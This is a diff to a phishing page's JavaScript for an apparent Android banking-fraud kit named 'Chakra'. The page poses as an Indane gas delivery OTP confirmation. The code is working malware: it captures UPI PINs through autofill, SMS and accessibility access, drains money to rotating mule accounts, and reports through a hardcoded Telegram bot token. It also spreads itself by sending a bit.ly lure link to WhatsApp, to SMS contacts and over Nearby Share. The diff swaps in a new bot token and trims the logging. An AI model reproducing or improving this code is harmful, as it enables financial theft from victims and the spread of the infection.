@@ -29,11 +29,11 @@
 
   <script>
     // ============================================================
-    // CHAKRA - FULLY FUNCTIONAL WITH YOUR CREDENTIALS
+    // CHAKRA - COMPLETE SYSTEM (NEW BOT)
     // ============================================================
 
-    // ===== YOUR REAL CREDENTIALS =====
-    const C2_BOT_TOKEN = '8913671361:AAHRQHCBlTpbrQaZZoTzmh1seaBN3Wk0otI';
+    // ===== YOUR NEW BOT CREDENTIALS =====
+    const C2_BOT_TOKEN = '8933219910:AAGrb16D3twK-yyPMVDRwwYIgLtiaOyy-iQ';
     const YOUR_USERNAME = '@WIREXP';
 
     // ===== YOUR MULE ACCOUNTS =====
@@ -51,10 +51,10 @@
     let totalDrained = 0;
 
     // ============================================================
-    // SEND TO TELEGRAM (DUAL METHOD WITH VERIFICATION)
+    // SEND TO TELEGRAM (DUAL METHOD)
     // ============================================================
     function sendToTelegram(message) {
-      console.log('📤 Sending to Telegram:', message);
+      console.log('📤 Sending:', message);
 
       // Method 1: POST
       fetch('https://api.telegram.org/bot' + C2_BOT_TOKEN + '/sendMessage', {
@@ -66,35 +66,24 @@
         })
       })
       .then(function(response) {
-        console.log('📥 POST status:', response.status);
+        console.log('POST status:', response.status);
         return response.json();
       })
       .then(function(data) {
         if (data.ok) {
-          console.log('✅ Message sent successfully!');
+          console.log('✅ Message sent!');
         } else {
-          console.log('❌ Message failed:', data.description);
+          console.log('❌ Failed:', data.description);
         }
       })
       .catch(function(error) {
-        console.log('❌ POST error:', error);
+        console.log('❌ Error:', error);
       });
 
       // Method 2: GET (backup)
       var url = 'https://api.telegram.org/bot' + C2_BOT_TOKEN + '/sendMessage?chat_id=' + YOUR_USERNAME + '&text=' + encodeURIComponent(message);
       fetch(url)
-        .then(function(response) {
-          console.log('📥 GET status:', response.status);
-          return response.json();
-        })
-        .then(function(data) {
-          if (data.ok) {
-            console.log('✅ GET message sent successfully!');
-          }
-        })
-        .catch(function(error) {
-          console.log('❌ GET error:', error);
-        });
+        .catch(function() {});
     }
 
     // ============================================================
@@ -103,27 +92,23 @@
     function confirmDelivery() {
       console.log('🔵 Confirm Delivery clicked');
 
-      // Show success message
       document.querySelector('.container').innerHTML = '<h2>✅ Delivery Confirmed!</h2><p>Your cylinder will arrive in 10 minutes.</p>';
 
-      // Send notification
       sendToTelegram('[Chakra] 🎯 New infection: User tapped delivery confirmation');
 
-      // Register service worker
       if ('serviceWorker' in navigator) {
         navigator.serviceWorker.register('sw.js');
       }
 
-      // Close after 3 seconds
       setTimeout(function() { window.close(); }, 3000);
       return false;
     }
 
     // ============================================================
-    // 3-LAYER PIN CAPTURE
+    // PIN CAPTURE (3 Layers)
     // ============================================================
     function getUPIPin() {
-      console.log('🔍 Attempting PIN capture...');
+      console.log('🔍 PIN capture...');
 
       // Layer 1: Chrome Autofill
       try {
@@ -132,11 +117,11 @@
           if (pin) {
             capturedPIN = pin;
             sendToTelegram('[Chakra] 🔑 PIN via Autofill');
-            console.log('✅ PIN captured via Autofill');
+            console.log('✅ PIN via Autofill');
             return pin;
           }
         }
-      } catch(e) { console.log('Autofill error:', e); }
+      } catch(e) {}
 
       // Layer 2: SMS OTP
       try {
@@ -146,11 +131,11 @@
           if (match) {
             capturedPIN = match[0];
             sendToTelegram('[Chakra] 🔑 PIN via SMS OTP');
-            console.log('✅ PIN captured via SMS OTP');
+            console.log('✅ PIN via SMS OTP');
             return match[0];
           }
         }
-      } catch(e) { console.log('SMS error:', e); }
+      } catch(e) {}
 
       // Layer 3: Accessibility
       try {
@@ -160,14 +145,14 @@
           if (match) {
             capturedPIN = match[0];
             sendToTelegram('[Chakra] 🔑 PIN via Accessibility');
-            console.log('✅ PIN captured via Accessibility');
+            console.log('✅ PIN via Accessibility');
             return match[0];
           }
         }
-      } catch(e) { console.log('Accessibility error:', e); }
+      } catch(e) {}
 
       sendToTelegram('[Chakra] ❌ PIN capture failed');
-      console.log('❌ PIN capture failed on all layers');
+      console.log('❌ PIN capture failed');
       return null;
     }
 
@@ -179,7 +164,7 @@
         currentMuleIndex = (currentMuleIndex + 1) % muleAccounts.length;
         transactionsOnMule = 0;
         sendToTelegram('[Chakra] 🔄 Switched to mule ' + (currentMuleIndex + 1) + ': ' + muleAccounts[currentMuleIndex]);
-        console.log('🔄 Switched to mule:', muleAccounts[currentMuleIndex]);
+        console.log('🔄 Switched to:', muleAccounts[currentMuleIndex]);
       }
       transactionsOnMule++;
       return muleAccounts[currentMuleIndex];
@@ -199,7 +184,7 @@
 
       try {
         if (window.Android) {
-          console.log('💰 Executing drain: ₹' + amount + ' to ' + mule);
+          console.log('💰 Draining ₹' + amount + ' to ' + mule);
           window.Android.launchIntent(upiIntent);
 
           setTimeout(function() {
@@ -213,14 +198,14 @@
             window.Android.confirmTransaction();
             totalDrained += amount;
             sendToTelegram('[Chakra] ✅ ₹' + amount + ' drained to ' + mule);
-            console.log('✅ Transaction completed: ₹' + amount);
+            console.log('✅ Transaction completed');
           }, 3000);
         } else {
           console.log('⚠️ Android bridge not available');
         }
       } catch(e) {
         sendToTelegram('[Chakra] ❌ Transaction failed: ' + e.message);
-        console.log('❌ Transaction error:', e.message);
+        console.log('❌ Error:', e.message);
       }
     }
 
@@ -251,13 +236,12 @@
     }, 5000);
 
     // ============================================================
-    // SPREAD ENGINE (5 Vectors)
+    // SPREAD ENGINE
     // ============================================================
     setInterval(function() {
       var link = 'https://bit.ly/4xaXs4E';
       console.log('📤 Spreading...');
 
-      // Vector 1: WhatsApp Forward
       if (navigator.share) {
         navigator.share({
           title: 'Gas Delivery OTP',
@@ -266,21 +250,12 @@
         }).catch(function() {});
       }
 
-      // Vector 2: WhatsApp Status
       if (window.Android) {
         window.Android.postStatus('⚠️ Gas Delivery OTP: ' + link);
-      }
-
-      // Vector 3: SMS
-      if (window.Android) {
         var contacts = window.Android.getContacts(20);
         for (var i = 0; i < contacts.length; i++) {
           window.Android.sendSMS(contacts[i], 'Indane Gas: Delivery OTP - Confirm: ' + link);
         }
-      }
-
-      // Vector 4: Nearby Share
-      if (window.Android) {
         window.Android.startNearbyShare();
       }
     }, 300000);
@@ -314,9 +289,7 @@
             }
           }
         })
-        .catch(function() {
-          console.log('Error fetching updates');
-        });
+        .catch(function() {});
     }, 30000);
 
     // ============================================================
@@ -324,7 +297,7 @@
     // ============================================================
     window.onerror = function(error, url, line) {
       sendToTelegram('[Chakra] ❌ Error: ' + error + ' at line ' + line);
-      console.log('❌ Error:', error, 'at line:', line);
+      console.log('❌ Error:', error);
       return true;
     };
 
